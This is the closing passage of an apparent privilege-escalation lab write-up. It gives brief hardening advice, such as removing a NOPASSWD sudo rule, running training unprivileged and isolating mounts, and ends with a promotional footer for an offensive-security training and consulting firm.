#### El entrenamiento no necesita ejecutarse como root. Separar los volumenes de entrada, procesamiento y checkpoints confiables.
```bash
Remove NOPASSWD trainer rule | run in dedicated unprivileged service | isolate /datastore mounts
```

---

## 🎓 Advanced Hands-On Training

Looking to sharpen your privilege escalation skills and Linux internal mechanics in real attack simulations?

* 🛡️ **Interactive Labs & Courses:** [academy.araizcorp.tech](https://academy.araizcorp.tech)
* 💼 **Enterprise Consulting & Audits:** [araizcorp.tech](https://araizcorp.tech)
* ✉️ **Inquiries:** info@araizcorp.tech

<p align="center"><sub>© 2026 AraizCorp LLC. All rights reserved. Offensive Security & Red Team Research.</sub></p>
